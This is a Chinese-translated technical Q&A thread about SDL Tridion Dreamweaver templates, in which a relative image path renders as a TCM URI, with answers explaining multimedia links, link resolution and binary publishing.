> 时间：2012-04-13T22:14:22.790
> 
> 标签：tridion

在 SDL Tridion、Dreamweaver 模板中，我必须在页面模板中设置我的图像的相对路径。

当我在 DWT 中有这样的代码时，Tridion 会产生如下输出。

DWT 标记

```
<img src="@@Field@@"/> 
```

模板渲染

```
<img src="image.jpg"/> 
```

但是，当我添加这样的相对路径时，模板返回`tcmid`

DWT 标记

```
<img src="Folder/img/@@Field@@"  type="text/css" rel="stylesheet"/ 
```

模板渲染

```
<img src="tcm:8-674"/> 
```

这会导致图像无法在网站中正确呈现。我尝试使用 Tridion 类型：多媒体等，但到目前为止没有任何效果。

有没有人见过类似的问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T22:32:53.043

您遇到的行为是 Tridion（Dreamweaver 中介）将您的`src`图像属性解释为内容管理器中项目的 WebDAV 路径。因此，如果它在 下找到多媒体组件`Folder/img/@@Field@@`，它将用该多媒体组件的 TCMURI 替换您的路径。这是预期的行为。

但是，我认为这不是您想要做的（从您的问题中不清楚）。您在 Tridion 中的图像是作为多媒体组件吗？你想展示这张图片吗？然后你应该在你的 DWT: 中使用多媒体链接（即到多媒体组件的链接）`<img src="@@Compoennt.Fields.link_to_mmc@@"/>`，其中字段`link_to_mmc`是在你的模式中定义的多媒体链接字段。然后还使用“解析链接”默认 TBB 将 TCMURI 转换为相对图像路径。

如果要链接到外部图像，则需要在 DWT 模板中指定该图像的 URL。像这样的东西`<img src="@@Component.Fields.external_url@@"/>`，Schema 中的 Text 字段在哪里`external_url`，它包含您要显示的外部图像的实际 URL。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-14T01:55:06.347

如果您的`imagefields`字段是指向多媒体组件的链接，那么您只需要`<img src="@@Field@@"/>`. 使用该 Tridion 将（按此顺序）：

1.  `@@Field@@`在执行 DWT 时将替换为图像的 TCM URI（例如 tcm:6-874）
2.  执行 DWT 后将图像项作为隐式步骤放入包中
3.  发布图像（作为 中的步骤之一`Default Finish Actions`）
4.  将 TCM URI (tcm:6-874) 替换为发布镜像的路径

由于您可能在 DWT 和默认完成操作之间有自定义 TBB，因此您可以使用它们来修改图像项目并影响发布的内容（以及在何处发布，使用项目属性）。

如果您正确设置了 Tridion 安装，您通常会将图像的基本路径存储在 Publication 属性中，然后步骤 3 将图像放入其中，步骤 4 将完整路径（包括您在发布属性）到 HTML 中。

如果您想对相对路径进行更多控制，则TBB`Publish Binaries in Package`和`Default Finish Actions`TBB 具有一个参数，可让您指定将图像发布到哪个结构组。这样，您可以让不同的模板将其图像输出到磁盘上的不同结构组/目录。

为了最终控制，您还可以决定自己发布二进制文件。在这种情况下，请查看`Publish Binaries in Package`TBB 的来源（可从 SDL Tridion World 上的论坛获得），根据您的需要对其进行修改，并将默认完成操作中的那个替换为您修改后的版本。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-14T00:09:39.047

似乎您快到了，只有当您将字符串添加为相对路径时，默认的 TBB 不再识别 SRC 属性中保存的 uri。如果您尝试将二进制文件发布到不同的位置，则需要将其绑定到不同的结构组，或者尝试更改出版物上的多媒体 URL。这样，图像将发布（并解析）到您的子目录。